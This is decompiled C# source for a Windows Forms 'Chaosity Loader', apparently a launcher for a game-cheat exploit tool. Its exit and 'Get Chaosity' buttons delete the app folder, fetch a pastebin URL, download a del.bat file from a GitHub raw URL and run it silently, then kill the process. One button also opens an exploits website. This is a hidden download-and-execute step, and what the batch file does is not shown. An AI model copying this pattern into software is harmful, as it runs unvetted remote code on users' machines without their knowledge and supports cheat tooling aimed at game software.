using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using ChaosityLoader.Properties;

namespace Chaosity_Loader;

public class Form1 : Form
{
	public const int WM_NCLBUTTONDOWN = 161;

	public const int HT_CAPTION = 2;

	private IContainer components = null;

	private Panel panel1;

	private Label label2;

	private Button button2;

	private Button button1;

	private Panel panel4;

	private Panel panel3;

	private Panel panel2;

	private Label label3;

	private Button button17;

	public Form1()
	{
		InitializeComponent();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Invalid comparison between Unknown and I4
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_010b: Invalid comparison between Unknown and I4
		DialogResult val = MessageBox.Show("Are You Sure You Want To Exit?", "Exit Chaosity", (MessageBoxButtons)4);
		if ((int)val == 6)
		{
			string path = "C:\\ChaosityLoader";
			if (Directory.Exists(path))
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(path);
				DirectoryInfo[] directories = directoryInfo.GetDirectories();
				foreach (DirectoryInfo directoryInfo2 in directories)
				{
					directoryInfo2.Delete(recursive: true);
				}
				FileInfo[] files = directoryInfo.GetFiles();
				foreach (FileInfo fileInfo in files)
				{
					fileInfo.Delete();
				}
				Directory.Delete(path);
			}
			using (WebClient webClient = new WebClient())
			{
				webClient.DownloadString("https://pastebin.com/raw/the3zHPy");
				webClient.DownloadFile("https://raw.githubusercontent.com/ChaosityYT/Chaosity-Scripts/master/del.bat", "del.bat");
				Process.Start(Directory.GetCurrentDirectory().ToString() + "/del.bat");
			}
			Process[] processesByName = Process.GetProcessesByName("ChaosityLoader");
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
			}
		}
		else if ((int)val == 7)
		{
		}
	}

	private void Button3_Click(object sender, EventArgs e)
	{
	}

	private void WeAreDevsDLL_Click(object sender, EventArgs e)
	{
	}

	private void button17_Click(object sender, EventArgs e)
	{
		Process.Start("https://easyexploits.com/exploits?exploitfocus=chaosity");
		string path = "C:\\ChaosityLoader";
		if (Directory.Exists(path))
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				directoryInfo2.Delete(recursive: true);
			}
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				fileInfo.Delete();
			}
			Directory.Delete(path);
		}
		using (WebClient webClient = new WebClient())
		{
			webClient.DownloadString("https://pastebin.com/raw/the3zHPy");
			webClient.DownloadFile("https://raw.githubusercontent.com/ChaosityYT/Chaosity-Scripts/master/del.bat", "del.bat");
			Process.Start(Directory.GetCurrentDirectory().ToString() + "/del.bat");
		}
		Process[] processesByName = Process.GetProcessesByName("ChaosityLoader");
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
		}
	}

	private void AddDrag(Control Control)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		Control.add_MouseDown(new MouseEventHandler(panel1_MouseDown));
	}

	[DllImport("user32.dll")]
	public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

	[DllImport("user32.dll")]
	public static extern bool ReleaseCapture();

	private void panel1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		if ((int)e.get_Button() == 1048576)
		{
			ReleaseCapture();
			SendMessage(((Control)this).get_Handle(), 161, 2, 0);
			if (((Form)this).get_Location().Y == 0)
			{
				((Form)this).set_WindowState((FormWindowState)2);
			}
		}
	}

	private void panel1_Paint(object sender, PaintEventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_00eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0136: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Expected O, but got Unknown
		//IL_014d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0157: Expected O, but got Unknown
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Expected O, but got Unknown
		//IL_01a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0291: Unknown result type (might be due to invalid IL or missing references)
		//IL_029b: Expected O, but got Unknown
		//IL_02c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c6: Expected O, but got Unknown
		//IL_03f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0499: Unknown result type (might be due to invalid IL or missing references)
		//IL_050b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0581: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05eb: Expected O, but got Unknown
		//IL_0618: Unknown result type (might be due to invalid IL or missing references)
		//IL_06aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_06b4: Expected O, but got Unknown
		//IL_06df: Unknown result type (might be due to invalid IL or missing references)
		panel1 = new Panel();
		label2 = new Label();
		button2 = new Button();
		button1 = new Button();
		panel4 = new Panel();
		panel3 = new Panel();
		panel2 = new Panel();
		label3 = new Label();
		button17 = new Button();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)panel1).set_BackColor(Color.Black);
		((Control)panel1).get_Controls().Add((Control)(object)label2);
		((Control)panel1).get_Controls().Add((Control)(object)button2);
		((Control)panel1).get_Controls().Add((Control)(object)button1);
		((Control)panel1).set_Dock((DockStyle)1);
		((Control)panel1).set_Location(new Point(7, 0));
		((Control)panel1).set_Margin(new Padding(4));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(403, 25));
		((Control)panel1).set_TabIndex(12);
		((Control)panel1).add_Paint(new PaintEventHandler(panel1_Paint));
		((Control)panel1).add_MouseDown(new MouseEventHandler(panel1_MouseDown));
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Bahnschrift", 8f));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(4, 4));
		((Control)label2).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(63, 17));
		((Control)label2).set_TabIndex(7);
		((Control)label2).set_Text("Chaosity");
		((Control)button2).set_BackColor(Color.Transparent);
		((Control)button2).set_Cursor(Cursors.get_Hand());
		((ButtonBase)button2).get_FlatAppearance().set_BorderColor(Color.FromArgb(80, 80, 80));
		((ButtonBase)button2).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button2).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(80, 80, 80));
		((ButtonBase)button2).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(80, 80, 80));
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_Font(new Font("Bahnschrift SemiCondensed", 7f));
		((Control)button2).set_ForeColor(Color.White);
		((Control)button2).set_Location(new Point(348, 0));
		((Control)button2).set_Margin(new Padding(4));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(27, 25));
		((Control)button2).set_TabIndex(4);
		((Control)button2).set_Text("_");
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((Control)button1).set_BackColor(Color.Transparent);
		((Control)button1).set_Cursor(Cursors.get_Hand());
		((ButtonBase)button1).get_FlatAppearance().set_BorderColor(Color.FromArgb(80, 80, 80));
		((ButtonBase)button1).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button1).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(80, 80, 80));
		((ButtonBase)button1).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(80, 80, 80));
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_Font(new Font("Bahnschrift SemiCondensed", 7f));
		((Control)button1).set_ForeColor(Color.White);
		((Control)button1).set_Location(new Point(372, 0));
		((Control)button1).set_Margin(new Padding(4));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(27, 25));
		((Control)button1).set_TabIndex(3);
		((Control)button1).set_Text("X");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)Button1_Click);
		((Control)panel4).set_BackColor(Color.Black);
		((Control)panel4).set_Dock((DockStyle)4);
		((Control)panel4).set_Location(new Point(410, 0));
		((Control)panel4).set_Margin(new Padding(4));
		((Control)panel4).set_Name("panel4");
		((Control)panel4).set_Size(new Size(7, 206));
		((Control)panel4).set_TabIndex(15);
		((Control)panel3).set_BackColor(Color.Black);
		((Control)panel3).set_Dock((DockStyle)3);
		((Control)panel3).set_Location(new Point(0, 0));
		((Control)panel3).set_Margin(new Padding(4));
		((Control)panel3).set_Name("panel3");
		((Control)panel3).set_Size(new Size(7, 200));
		((Control)panel3).set_TabIndex(13);
		((Control)panel2).set_BackColor(Color.Black);
		((Control)panel2).set_Dock((DockStyle)2);
		((Control)panel2).set_Location(new Point(0, 200));
		((Control)panel2).set_Margin(new Padding(4));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(410, 6));
		((Control)panel2).set_TabIndex(14);
		((Control)label3).set_BackColor(Color.Transparent);
		((Control)label3).set_Font(new Font("Segoe UI", 28.2f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(2, 47));
		((Control)label3).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(445, 65));
		((Control)label3).set_TabIndex(16);
		((Control)label3).set_Text("Chaosity Exploit");
		((Control)button17).set_BackColor(Color.FromArgb(25, 25, 25));
		((ButtonBase)button17).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button17).set_FlatStyle((FlatStyle)0);
		((Control)button17).set_Font(new Font("Segoe UI", 7.8f, (FontStyle)3));
		((Control)button17).set_ForeColor(Color.White);
		((Control)button17).set_Location(new Point(119, 127));
		((Control)button17).set_Margin(new Padding(4));
		((Control)button17).set_Name("button17");
		((Control)button17).set_Size(new Size(164, 36));
		((Control)button17).set_TabIndex(17);
		((Control)button17).set_Text("Get Chaosity");
		((ButtonBase)button17).set_UseVisualStyleBackColor(false);
		((Control)button17).add_Click((EventHandler)button17_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImage((Image)(object)Resources.Chaosity);
		((Form)this).set_ClientSize(new Size(417, 206));
		((Control)this).get_Controls().Add((Control)(object)button17);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).get_Controls().Add((Control)(object)panel3);
		((Control)this).get_Controls().Add((Control)(object)panel2);
		((Control)this).get_Controls().Add((Control)(object)panel4);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Chaosity Loader");
		((Form)this).set_TransparencyKey(Color.Fuchsia);
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
